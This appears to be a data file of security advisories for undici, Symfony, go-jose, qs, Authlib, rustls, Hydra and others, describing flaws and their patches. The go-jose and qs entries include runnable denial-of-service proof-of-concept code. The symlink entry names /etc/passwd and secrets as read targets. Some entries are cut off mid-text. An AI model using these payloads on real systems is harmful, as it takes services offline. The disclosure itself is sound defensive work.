The primary remediation should be to execute Terraform using an argument vector rather than constructing shell source—for example, `exec.Command(binaryPath, args...)`. Any required environment-variable expansion should be performed without invoking a shell. Strict workspace-name validation would also provide defense in depth.

- Atlantis processes `atlantis.yaml` from the pull request branch.
- The pull request is eligible to run `atlantis plan`.
- For a fork pull request, the server must have `--allow-fork-prs` enabled. A same-repository branch does not require this flag.
- No custom workflows or apply permissions are required.

}

items.summary:
## Summary

File read paths resolve symbolic links with `filepath.EvalSymlinks` and then operate on the resolved target without re-checking that the target still lies inside the user's source/scope. 

A symlink located inside a user's accessible directory that points outside the scope (for example to `/etc/passwd`, another tenant's directory, SSH keys, or container secrets) is followed transparently, and its contents are served through the normal download, preview, media, and OnlyOffice endpoints. Any authenticated user with download access can read files anywhere the server process can, whenever such a symlink is reachable in their scope. 

The same symlink-following read path is used by the public share endpoints, which are authorized only by a share hash and not by any account, so when a public share exposes a directory that contains such a symlink, an unauthenticated attacker holding only the share link reads files outside the scope with no credential.

## Details

**1. Symlink resolution performs no containment check (`indexing/iteminfo/utils.go:110-119`)**

```go
func ResolveSymlinks(path string) (string, bool, error) {
    resolvedPath, err := filepath.EvalSymlinks(path)   // follows the link to its real target
    if err != nil {
        return path, false, fmt.Errorf("could not resolve symlinks for %s: %v", path, err)
    }
    info, err := os.Lstat(resolvedPath)
    // ...
    return resolvedPath, IsDirectory(info), nil         // returned with no scope validation
}
```

There is no comparison of `resolvedPath` against the index/scope root.

**2. `GetRealPath` returns the resolved target unchecked (`indexing/indexingFiles.go:991-1008`)**

```go
absolutePath, err := filepath.Abs(joinedPath)
// ...
realPath, isDir, err := iteminfo.ResolveSymlinks(absolutePath)   // escapes scope here
// ...
return realPath, isDir, err
```

`realPath` is then used by file handlers to open and serve the file. No caller re-validates that `realPath` is a descendant of the user's source root. (By contrast, the project did add containment for archive extraction via `symlinkTargetStaysUnderDest`, but that guard is specific to extraction and is not applied to this general read path.)

**3. The read handlers request symlink following, including the unauthenticated public-share handlers (`http/resource.go:96,503`, `http/media.go:124`, `http/onlyOffice.go:133`, `http/public.go:279,441,494`)**

```go
FollowSymlinks: true,
```

Authenticated download, preview, media-subtitle, and OnlyOffice read flows all set `FollowSymlinks: true`, and so do the public share handlers in `http/public.go`. The public download route is registered as `publicApi.HandleFunc("GET /resources/download", withHashFile(publicDownloadHandler))` (`http/httpRouter.go:130`), where `withHashFile` authorizes by the share hash alone with no account, so the same escape is reachable with no authentication when a public share exposes a directory containing the symlink.

items.title: undici vulnerable to cache poisoning and cross-user disclosure via cross-origin redirects
items.summary:
### Impact

When an originless `Agent` composes the redirect and cache interceptors as `compose(redirect(), cache())` with a shared cache (`type: 'shared'`), the cache builds its key from the original request URL before the redirect handler changes the origin. The response produced after a redirect is then stored under the original key, even when the redirect crossed to a different origin.

An attacker who controls the target of a redirect from a trusted URL can have their response cached under that trusted URL. A later caller requesting the trusted URL receives the attacker's body from the shared cache without either origin being contacted, allowing persistent cache poisoning. The same key confusion also discloses private data: when an authenticated request returns a `private, no-store` redirect to a user-specific resource, the final response is stored under the original URL and can be served to a later unauthenticated caller.

The cache interceptor was introduced in undici 7.0.0, and all 7.x and 8.x releases before the patched versions are affected. Applications are affected only when an originless `Agent`, a shared `MemoryCacheStore` or `SqliteCacheStore`, and the composition `compose(redirect(), cache())` are all used. Origin-bound `Client` and `Pool` dispatchers, and the reverse composition `compose(cache(), redirect())`, are not affected.

### Patches

Upgrade to `7.30.1` or `8.12.2`. Before storing a response, undici now verifies that the origin that produced it still matches the cache key, and preserves each redirect hop's cache-control policy, so cross-origin redirect responses and responses behind a `no-store` or `private` hop are no longer cached under the original key.

### Workarounds

Compose the interceptors as `compose(cache(), redirect())`, use per-origin dispatchers and cache stores, or disable shared caching on redirect-capable requests.

items.title: undici vulnerable to TLS certificate validation bypass via dropped tls options in Agent
items.summary:
### Impact

undici's `Agent` passes its constructor options through a JSON-based deep clone (`JSON.parse(JSON.stringify(...))`) before forwarding them to each per-origin `Pool`. JSON cannot represent functions, so a caller-supplied `tls` option containing a `checkServerIdentity` callback is silently dropped before it reaches the TLS layer. As a result, a TLS peer whose certificate a custom `checkServerIdentity` was written to reject, but which passes Node's default hostname and chain checks, is silently accepted when the request is made through `Agent`. Because `Agent` is the default dispatcher behind `request`, `fetch`, and `setGlobalDispatcher`, this is the path most applications use. `EnvHttpProxyAgent` is also affected on its direct and `NO_PROXY` routes, which delegate to an internal `Agent`.

Only applications that pass a function-valued `tls` option (such as a custom `checkServerIdentity` for certificate or public-key pinning) are affected. Passing the same options through `connect` is not affected. This is the `Agent` counterpart of the `BalancedPool` certificate validation bypass fixed in CVE-2026-84961.

### Patches

Upgrade to undici `6.29.1`, `7.30.1`, or `8.12.2`. `Agent` now preserves the `tls` option outside the JSON clone, so custom TLS verification callbacks are forwarded to each origin unchanged.

### Workarounds

Pass the TLS options through `connect` instead of `tls`. For proxied `EnvHttpProxyAgent` destinations, use `requestTls` / `proxyTls`.

items.title: undici vulnerable to Denial of Service via TLS 1.2 certificate-changing renegotiation
items.summary:
## Impact

undici crashes the client process when a TLS 1.2 server renegotiates after the connection is established and presents a different, CA-trusted certificate whose hostname does not match the requested host. Node.js re-runs hostname verification on the renegotiated handshake and destroys the socket with `ERR_TLS_CERT_ALTNAME_INVALID`. undici's established socket error handler asserted that this error code could never occur, so the peer-controlled error became an uncaught `AssertionError` that terminates the Node.js process. Both the HTTP/1.1 and HTTP/2 paths are affected.

A malicious or compromised HTTPS endpoint reached through undici or the global `fetch()` can crash the client with a single server-initiated renegotiation, taking down all in-flight requests and background work in the process. Only TLS 1.2 is affected, because TLS 1.3 does not support renegotiation. Exploitation does not require a CA compromise: the attacker controls the endpoint and can present two ordinary valid certificates, the first matching the requested URL and the second intentionally not matching it.

## Patches

Upgrade to undici 6.29.1, 7.30.1, or 8.12.2.

## Workarounds

Restrict outbound connections to TLS 1.3, for example by setting `connect: { minVersion: 'TLSv1.3', maxVersion: 'TLSv1.3' }` on the client or agent, so that renegotiation cannot occur, when the target endpoints support TLS 1.3.

items.title: undici WebSocket client vulnerable to Denial of Service via unbounded automatic PONG buffering
items.summary:
### Impact

undici's WebSocket client (including Node.js's bundled `globalThis.WebSocket`) can be driven to exhaust process memory by a malicious or compromised WebSocket server. For every PING frame received, the receiver automatically writes a PONG response to the socket and ignores the `false` return value from `socket.write()`, which is a backpressure signal, so a server that streams small PING frames while never reading the client's PONGs makes the outbound write queue and heap grow without bound until the Node.js process runs out of memory and terminates. The attack is remote and unauthenticated, needs only a normal WebSocket connection, and is asymmetric: small inbound PINGs produce a much larger retained outbound queue. Availability is the only impact. undici 5.x, 6.x, 7.x, and 8.x are affected; the WebSocket client was introduced in 5.15.0.

### Patches

Upgrade to `6.29.1`, `7.30.1`, or `8.12.2`, which pause WebSocket frame parsing when the automatic PONG response hits socket backpressure and resume on drain, bounding the outbound queue.

### Workarounds

None.

items.title: undici vulnerable to Denial of Service via unhandled exception in the decompress interceptor
items.summary:
## Impact

undici's `decompress` interceptor forwards decompressed response data to the downstream handler from zlib stream event callbacks without catching exceptions those callbacks may throw. undici's engine converts a synchronous throw from a downstream handler into a per-request failure, but that protection is not in place when the throw happens asynchronously from a zlib callback. As a result, a downstream handler that throws by design, for example the built-in `dump` interceptor which throws when a response exceeds its `maxSize`, escapes as an uncaught exception and terminates the Node.js process.

A malicious or compromised HTTP server can crash any client that composes the `decompress` interceptor with `dump` (or another response handler that throws), by returning a small compressed body that decompresses to more than the configured limit. The compressed bytes on the wire are tiny, so only the decompressed size matters. If the application keeps the process alive with a global uncaught-exception handler, the affected request instead hangs until the body timeout.

## Patches

Upgrade to undici 7.30.1 or 8.12.2.

## Workarounds

Avoid composing the `decompress` interceptor with a response handler that throws during response processing (such as `dump` with a `maxSize`) until upgrading.

items.title: MCP TypeScript SDK: HTTP server transports and handlers did not limit request body size or JSON-RPC batch length
items.summary:
### Summary
In affected versions, MCP servers reachable over HTTP put no limit on the size of a POST body or on the number of messages in a JSON-RPC batch. Large requests could exhaust the server's memory, and one long batch could block it from serving anyone else. No credentials were needed, unless your application authenticates requests before they reach the SDK.

### Am I affected?
Yes, if clients you do not fully trust can reach your server over Streamable HTTP. A body parser such as `express.json()` does not protect you, because it does not limit batch length. Servers that only use stdio are not affected.

Affected versions:

- `@modelcontextprotocol/sdk` 1.10.0 through 1.30.0
- `@modelcontextprotocol/server` 2.0.0
- `@modelcontextprotocol/node` 2.0.0
- `@modelcontextprotocol/hono` 2.0.0

### Fix
Upgrade to:

- 1.x: `@modelcontextprotocol/sdk` 1.30.1 or later
- 2.x: `@modelcontextprotocol/server` 2.1.0, `@modelcontextprotocol/node` 2.1.0 and `@modelcontextprotocol/hono` 2.0.1 or later. Upgrade every one you have installed.

Bodies over 4 MiB now get `413`, and batches over 100 messages get `400`. If your clients send larger bodies, raise the new `maxRequestBodySize` option.

If you cannot upgrade yet, cap request body size in a reverse proxy.

items.title: Symfony: Unbounded Recursion in the YAML Inline Lexer Lets a Single Document Crash the Process
items.summary:
### Description

`Yaml\Parser::lexInlineStructure()` recursed through `lexInlineMapping()` and `lexInlineSequence()` for every `{` and `[` of an inline collection, without entering the nesting level that the rest of the parser bounds with `maxNestingLevel`. A document made of deeply nested inline collections, such as `[[[[...]]]]`, exhausted the stack while it was being lexed: depending on the PHP version and its stack settings, the process crashed or the request ended with a fatal error.

Any code parsing untrusted YAML is affected. That includes `#[MapRequestPayload]` when the Yaml component is installed and the endpoint does not restrict `acceptFormat`: a single unauthenticated request with a YAML content type is enough.

### Resolution

The inline lexer now enters and leaves the same nesting level as the rest of the parser, so nested inline collections are bounded by `maxNestingLevel`, and the parser raises a `ParseException` beyond it.

The patches for this issue are available [here](https://github.com/symfony/symfony/commit/2a8bf9c58d862b0c76a35ce288d1ba6a27223aad) for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).

### Credits

We would like to thank Nicolas Grekas for reporting the issue and providing the fix.

### References

- Fix: [#65688](https://github.com/symfony/symfony/pull/65688)

items.title: Symfony: ReDoS in HeaderUtils::split() Reachable Through the Cache-Control Request Header
items.summary:
### Description

`HeaderUtils::split()` parsed header values with a pattern whose token alternative also matched whitespace, followed by a `(?<!\s)` lookbehind. A run of whitespace placed before a separator could be divided among the iterations of the enclosing repetition in exponentially many ways, and the engine tried all of them before settling. `HeaderBag` calls it for the `Cache-Control` header whenever a `Request` is built, so any application handling HTTP requests is reachable, with no authentication.

A single request carrying such a header costs close to a second of CPU (813 ms for a run of 17 spaces in an 8 KB header on PHP 8.5, doubling with each extra space). From 18 spaces on, `preg_match_all()` gives up at `pcre.backtrack_limit` and `split()` returns an empty array, so every directive of the header is silently dropped.

### Resolution

The pattern now consumes whitespace only when more of the value follows it, so a value can no longer end on whitespace, nothing has to be given back, and every quantifier is possessive. The first release of this fix broke splitting on a whitespace separator: `HeaderUtils::split('foo bar', ' ')` returned a single value in 6.4.46 to 6.4.47, 7.4.19 to 7.4.20 and 8.1.7 to 8.1.8. Whitespace characters used as separators are now left out of the whitespace branch, which 6.4.48, 7.4.21 and 8.1.9 contain.

The patches for this issue are available [here](https://github.com/symfony/symfony/commit/343a1772ce6ac03e48b228d2d7168d19750e3f36) for branch 5.4 (and forward-ported to 6.4, 7.4, 8.1 and 8.2).

### Credits

Symfony would like to thank [r3verii](https://github.com/r3verii) for reporting the issue and Nicolas Grekas for providing the fix.

Symfony would also like to thank [Bruno Dias](https://github.com/cx-bruno-dias) from Checkmarx for his help getting a CVE assigned.

items.title: Go JOSE: DoS when parsing JWKs that contain RSA keys
items.summary:
### Summary

A crafted RSA key inside a JWK can cause operations that parse JWKs to consume excess CPU.

### Details

go-jose does not check for bounds on RSA modulus and primes before validating them. Values are passed directly to `crypto/rsa.PrivateKey.Validate()`. On Go 1.24+, this takes cubic time complexity with respect to the RSA modulus and primes. This allows an attacker to supply a crafted JWK to consume excessive CPU.

https://github.com/go-jose/go-jose/blob/5b371aecfcf7aabe06068d67da4344591ecddc76/jwk.go#L655-L700

### Proof of concept

No special configuration of go-jose is required to reproduce this vulnerability.

```go
package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"time"

	"github.com/go-jose/go-jose/v4"
)

func main() {
	// The RSA parameters can be complete junk. The CPU cost is in validating them.
	primeBits := 16384
	p := new(big.Int).Lsh(big.NewInt(1), uint(primeBits-1))
	p.SetBit(p, 0, 1)
	n := new(big.Int).Lsh(big.NewInt(1), 2048)
	e := big.NewInt(65537)
	d := big.NewInt(3)
	q := big.NewInt(3)

	jwk := map[string]string{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(n.Bytes()),
		"e":   base64.RawURLEncoding.EncodeToString(e.Bytes()),
		"d":   base64.RawURLEncoding.EncodeToString(d.Bytes()),
		"p":   base64.RawURLEncoding.EncodeToString(p.Bytes()),
		"q":   base64.RawURLEncoding.EncodeToString(q.Bytes()),
	}

	protected := map[string]any{
		"alg": "RS256",
		"jwk": jwk,
	}
	protJSON, _ := json.Marshal(protected)

	jws := map[string]string{
		"protected": base64.RawURLEncoding.EncodeToString(protJSON),
		"payload":   base64.RawURLEncoding.EncodeToString([]byte(`{}`)),
		"signature": base64.RawURLEncoding.EncodeToString([]byte("not-a-real-signature")),
	}
	jwsJSON, _ := json.Marshal(jws)

	start := time.Now()
	_, err := jose.ParseSigned(string(jwsJSON), []jose.SignatureAlgorithm{jose.RS256})
	elapsed := time.Since(start)

	fmt.Printf("prime bits: %d\n", primeBits)
	fmt.Printf("parse time: %s\n", elapsed)
	fmt.Printf("parse error: %v\n", err)
}
```

### Impact

Denial of service vulnerability. Any application that uses go-jose to parse JWKs from untrusted sources is affected and should patch immediately.

### Credits

Reported by Yuval Saggie and Mor Weinberger (powered by Echo Frontier)

items.title: CTFer.io's CTFd Terraform Provider allows a local or remote attacker to read team passwords in state as non sensitive values
items.summary:
### Impact

CTFer.io's CTFd Terraform Provider stores `ctfd_team.password` as non-sensitive values (CWE-522). A local or remote attacker, who can have access to the Terraform state, can read team passwords without the need for the state password for decryption.

### Patches

Patched in v2.8.2.

### Workarounds

No workaround exist, yet CTFer.io recommends you keep your state in safe environments with a limited set of users who can access it as a good practice to avoid exploitation of this vulnerability.

items.title: Hydra legacy target blacklist permits unsafe PyYAML loading
items.summary:
## Summary

Hydra's legacy target blacklist omits PyYAML's unsafe loading surfaces. If an
application passes attacker-controlled targets and arguments to instantiate(),
a target such as yaml.unsafe_load can execute Python code through a
config-controlled YAML stream containing Python object-construction tags.

## Impact and prerequisites

The attacker must control the relevant target and arguments that the application
instantiates. The configured callable executes with the application's process
privileges. This is a gap in the best-effort legacy blacklist. It is not a bypass
of Hydra 1.4's execution whitelist supplied by trusted Python code.

One realistic exposure is a model downloaded from a third-party repository,
such as Hugging Face, that bundles attacker-controlled configuration. When a
victim loads the model using application code that passes this configuration
to legacy Hydra instantiation without effective target restrictions, the
model's metadata can execute code in the victim process. This model-loading
attack pattern is documented in the original Hydra advisory
GHSA-2cp2-2r3c-7p7r and the associated Unit 42 research. It does not imply that
all Hugging Face models or currently patched downstream loaders are affected.

Hydra 1.3's blacklist is defense in depth, not a complete security boundary.
Hydra 1.4 is affected on its deprecated no-whitelist legacy path. Installed
application wrappers can perform indirect operations beyond a name-based
blacklist's coverage; this fix does not make arbitrary configuration safe.

The unsafe_load finding is directly reproduced. PyYAML 6.0.3 full_load rejects
the demonstrated python/object/apply payload, so the finding does not claim that
all PyYAML loading APIs execute that payload.

## Remediation

The fix blocks the yaml. target namespace except for the exact yaml.safe_load,
yaml.safe_load_all, yaml.safe_dump, and yaml.safe_dump_all functions. Loader
classes, constructor registration, general dump/load APIs, and other targets in
the namespace remain blocked. Existing canonical-identity checks also cover
aliases. The fix preserves Hydra 1.4's explicit unsafe opt-out for trusted use.

## Workarounds

Do not pass untrusted configuration to instantiate() or call(). For Hydra 1.4,
supply a narrow execution whitelist from trusted Python code. Do not let
untrusted configuration select its own execution policy or opt out of checks.

## Affected releases

The reported incomplete-remediation stable range is hydra-core 1.3.6 through
1.3.7. The 1.4 prerelease legacy path is also affected, including 1.4.0.dev9,
1.4.0.dev10, 1.4.0rc1, and 1.4.0rc2. The related blacklist advisory
GHSA-rqx7-p7vv-w7hr was first patched in 1.3.6 and 1.4.0.dev9; these ranges
describe the remaining omission after that remediation.

## Credit

Reported by zx (@manus-pi).

items.title: qs : qs.stringify with arrayFormat 'comma' throws an uncaught TypeError on array elements carrying a non-callable own toString (DoS)
items.summary:
## Summary

`qs.stringify(obj, { arrayFormat: 'comma' })` throws an uncaught `TypeError: Cannot convert object to primitive value` when an array in `obj` contains an element that carries an own, non-callable `toString` property (for example `{ a: [ { toString: 'x' } ] }`). A remote, unauthenticated attacker who can influence an object that the application later re-serializes with the comma array format triggers the throw. In a service that lacks a synchronous error boundary around the serialization call, the uncaught exception crashes the worker process, producing a denial of service.

## Root Cause

When `arrayFormat: 'comma'` is selected, the comma branch collapses the whole array into a single value via `Array.prototype.join`, or, under `encodeValuesOnly: true`, maps each element through the value encoder before joining. Both paths perform an implicit string coercion (`ToPrimitive` with hint `"string"`) on each element. For an object whose own `toString` is a non-callable value, coercion skips the shadowed non-callable `toString`, falls through to `Object.prototype.valueOf` (which returns the object rather than a primitive), and throws. The comma branch runs this coercion before the per-element null and skip handling in the main loop, so nothing downstream can neutralize the hostile element, and the throw is never caught inside the library.

```text
lib/stringify.js  (comma-array branch)
  line 152-154: obj = utils.maybeMap(obj, function (v) { return v == null ? v : encoder(v); });  // encodeValuesOnly path
  line 156:     objKeys = [{ value: obj.length > 0 ? obj.join(',') || null : void undefined }];   // default comma path
lib/utils.js
  line 292:     string = String(str);   // value encoder coercion reached via the encodeValuesOnly path
```

## Impact

Prerequisites: the application calls `qs.stringify` with `arrayFormat: 'comma'` (a documented, supported option) on an object whose shape can be influenced by attacker input. Attacker-controllable sources include `qs.parse(input, { allowPrototypes: true })`, which retains a `toString` segment (Express 4's default query parser, Express 5's `extended` query parser, and body-parser's `extended` urlencoded parser all set it), `qs.parse(input, { plainObjects: true })`, whose null-prototype elements throw even without a `toString` key (eg, `a[][b]=c`), and `JSON.parse` of a request body, which needs no qs parse option at all. No authentication or user interaction is required. Demonstrated capability: a single request forces an uncaught synchronous `TypeError` in the serialization call. In a naive single-process Node service with no synchronous error boundary, this crashes the process and takes the service offline (availability impact). Under a framework such as Express that traps synchronous handler throws, the plausible outcome is a per-request 500 rather than a full outage; that lower-impact case is noted but not the worst credible supported deployment. There is no confidentiality or integrity impact, no memory unsafety, and no prototype pollution.

## Proof of Concept

`Install qs at the affected version (for example 6.16.0) and run the following script with Node.js. No network setup is required; it demonstrates the throw in isolation.`

```js
var qs = require('qs');

// Source A: qs.parse with allowPrototypes retains the hostile toString segment
qs.stringify(qs.parse('a[0][toString]=x', { allowPrototypes: true }), { arrayFormat: 'comma' });

// Source B: a JSON request body, no qs parse option needed
qs.stringify(JSON.parse('{"a":[{"toString":"x"}]}'), { arrayFormat: 'comma' });

// Also affected: the encodeValuesOnly sub-path
qs.stringify(JSON.parse('{"a":[{"toString":"x"}]}'), { arrayFormat: 'comma', encodeValuesOnly: true });
```

```text
A default-join (allowPrototypes) => THREW: TypeError: Cannot convert object to primitive value
B default-join (JSON.parse) => THREW: TypeError: Cannot convert object to primitive value
C encodeValuesOnly path => THREW: TypeError: Cannot

items.title: undici WebSocket client vulnerable to Denial of Service via failed HTTP/2 handshake
items.summary:
### Impact

undici's experimental WebSocket client (enabled by default via `allowH2: true`) crashes the Node.js process when it connects to a malicious server over HTTP/2. If the server answers the WebSocket upgrade with a response that fails handshake validation, undici aborts the request, but the abort is a no-op because the request is already marked completed, so the underlying `ClientHttp2Stream` is left open with no error listener. When the server then destroys the connection, the orphaned stream emits an unhandled `error` and the process exits. A remote, unauthenticated server can therefore deny service to any client that opens a WebSocket to it over HTTP/2. undici 8.11.0 and 8.11.1 are affected; the regression was introduced in 8.11.0.

### Patches

Upgrade to `8.11.2`.

### Workarounds

Set `allowH2: false` to disable HTTP/2 for WebSocket connections, or avoid opening WebSocket connections to untrusted servers, until upgrading.

items.title: Authlib accepts an empty HMAC key, allowing JWS/JWT signature forgery (HS256/HS384/HS512)
items.summary:
Reporter: Cavan Loughran, Celvex Group Inc.

Summary

Authlib's symmetric (oct) key handling accepts an empty key (empty bytes b'' / empty string '') as a valid HMAC signing and verification key. An empty HMAC key produces a deterministic digest that any party can reproduce, so an attacker who knows (or can cause) the application to verify a token with an empty key can forge arbitrary tokens that pass HS256/HS384/HS512 signature verification. This is the Authlib member of the cross-language empty-HMAC-key family already assigned CVE-2026-44351 (fast-jwt, npm) and CVE-2026-45363 (ruby-jwt, RubyGems).

This is DISTINCT from Authlib's existing recent JWT-verification advisories. It is not closed by CVE-2026-27962 / GHSA-wvwj-cvrp-7pv5 (JWS JWK header injection, the key=None case), nor by CVE-2026-28802 / GHSA-7wc2-qxgw-g8gg (alg:none blank-signature bypass), nor by GHSA-5357-c2jx-v7qh (algorithm confusion with asymmetric public keys). Those address header-driven key injection, the none algorithm, and asymmetric-vs-symmetric confusion respectively; none of them rejects a zero-length oct key.

Affected versions

Authlib <= 1.7.2 (latest release 1.7.2, 2026-05-06). Confirmed present at the v1.7.2 release tag and on the current main HEAD. The affected code is in authlib/jose/rfc7518/oct_key.py and authlib/jose/rfc7518/jws_algs.py.

Root cause (exact code location, release tag v1.7.2)

- authlib/jose/rfc7518/oct_key.py, class OctKey:
  - validate_raw_key is a type-only check: `return isinstance(key, bytes)`. An empty bytes object passes.
  - import_key rejects only keys whose material starts with known unsafe prefixes (`if raw_key.startswith(POSSIBLE_UNSAFE_KEYS): raise ValueError(...)`, i.e. PEM/SSH prefixes). Empty bytes do not match any unsafe prefix, so b'' is accepted.
  - get_op_key loads the raw key without validating its length.
  - No check anywhere rejects a zero-length key, so an empty key b'' passes every gate.
- authlib/jose/rfc7518/jws_algs.py, class HMACAlgorithm:
  - prepare_key: `return OctKey.import_key(raw_data)`.
  - sign / verify call key.get_op_key(...) then `hmac.new(op_key, msg, self.hash_alg)` / `hmac.compare_digest(...)`. With an empty op key this becomes hmac.new(b'', ...): a deterministic, publicly reproducible digest. There is no empty-key or minimum-length check.

Why this is a real signature bypass

An empty HMAC key makes the signature a public, deterministic function of the header and payload, so anyone can compute a valid signature and forge tokens. The realistic trigger matches the sibling CVEs: the deploying application sources the verification key from a place that can be empty at runtime, for example os.environ.get('JWT_SECRET', ''), a database/config column whose default is '', or a key-resolver that returns '' on a miss. Authlib is widely used to BUILD token verifiers (OAuth 2.0 resource servers, OIDC relying parties), and Authlib's own recent advisory history shows the JWS/JWT verify path is the live attack surface, so a key-resolution path that can yield '' is a realistic exposure.

Reproduction (prose, no weaponized exploit)

1. In an application that uses Authlib to verify JWS/JWT, arrange for the verification key to be an empty value (e.g. an unset environment variable defaulted to '').
2. An attacker constructs a token with header {alg: HS256} and an arbitrary payload, and computes the HS256 signature using an empty key (a value any party can reproduce because the key is empty).
3. Authlib's HMAC verification accepts the token as validly signed, because OctKey.import_key did not reject the empty key and hmac.compare_digest matches the attacker-computable digest. The forged token is treated as authentic.

No live system was probed; the above describes the class. The vulnerable code path and the absent guard are confirmed by direct reading of the public source at the v1.7.2 tag and on current main.

Proof the fix is known-good (no novelty risk)

The same maintainer's newer JOSE library, jose

items.title: rustls: ECH rejection can expose buffered application data to authenticated outer server before `ech_required` alert
items.summary:
In rustls 0.23.44 and 0.23.45, application data that a client buffers before the handshake completes is sent to the server even when the server rejects Encrypted Client Hello (ECH).

When the server rejects ECH, the client completes the handshake with the outer ClientHello and authenticates the server against the ECH config's `public_name`. At the end of the handshake, `start_traffic()` encrypts and queues any plaintext buffered by `ClientConnection::writer()`. It does this *before* checking for `EchStatus::Rejected` and queueing the `ech_required` alert.

The application then receives `Error::PeerIncompatible(ServerRejectedEncryptedClientHello)`, as expected. However, the client is still expected to call `write_tls()` to send the fatal alert, and that call also sends the encrypted application data. The server decrypts the data and only then receives the alert.

The ordering bug is older than 0.23.44. Before 0.23.44, the client checked the server certificate against the inner server name rather than `public_name`, so a correctly configured server failed certificate verification first and no data was sent. 0.23.44 fixed that check, which makes the ordinary rejection path reachable.

# Impact

Plaintext meant for the inner server, the one named in the encrypted ClientHello, goes to the client-facing server identified by `public_name`. That server is properly authenticated, so this is not an attack by an unauthenticated party. However this violates [RFC 9849](https://www.rfc-editor.org/info/rfc9849), which says the following:

- Section 6.1.6: if the handshake and authentication succeed after ECH rejection, the client "MUST ... abort the connection with an "ech_required" alert **before sending any application data to the server.**"
- Section 6.1.7: the certificate is checked only against `public_name`, and the connection "MUST NOT" be reported as successful to the application. rustls does report failure correctly. The problem is only that data is sent before the alert.

This affects only clients that meet all of these conditions:

- They use `EchMode::Enable`. GREASE ECH is not affected.
- They write application data before the handshake completes.
- They connect to a server that rejects their ECH config, for example because the config is stale. This is the same case where the server returns retry configs.

The usual client response to rejection is to retry with the server's retry configs. In that case, the data has already gone to the outer server.

items.title: rustls: An unauthenticated ServerHello poisons the per-name key-exchange record, so later ClientHellos carry only a classical X25519 share
items.summary:
## Summary

The client records the server-selected key-exchange group per server name when it processes the ServerHello, before the server is authenticated. A network attacker can answer one connection attempt for a target name with a ServerHello that selects X25519 and close the connection. Later ClientHellos for that name carry one X25519 share while supported_groups still lists X25519MLKEM768 first. If the server accepts that share instead of sending a HelloRetryRequest, the handshake completes with classical key exchange only and no error.

An attacker that answers one connection attempt for the target name with a ServerHello selecting X25519 changes every later ClientHello of that client for that name, for as long as the entry stays in the store. No certificate or completed handshake is needed: it parses the ClientHello, sends the ServerHello, and closes.

TLS 1.3 transcript binding stops an on-path attacker from editing the ClientHello of one connection. It does not stop the attacker from steering the client's prediction state beforehand, because that state is written from an unauthenticated message.

## What does not trigger it

- Servers that send a HelloRetryRequest. The connection stays hybrid and costs one extra round trip.
- A client configuration with resumption disabled: nothing is stored.
- A different server name: the record is per name.

## Impact

If the genuine server picks the group for which a share is present, instead of sending a HelloRetryRequest for its preferred hybrid group, the handshake completes with classical key exchange only, between two peers that both support the hybrid group. No error is raised. The confidentiality of recorded sessions against a future quantum adversary is lost for those connections (harvest now, decrypt later). There is no key compromise and no authentication bypass.

Note that this behaviour is discussed at length in [draft-ietf-tls-key-share-prediction](https://www.ietf.org/archive/id/draft-ietf-tls-key-share-prediction-01.html#name-security-considerations) so the actual security impact is largely down to a server policy decision.
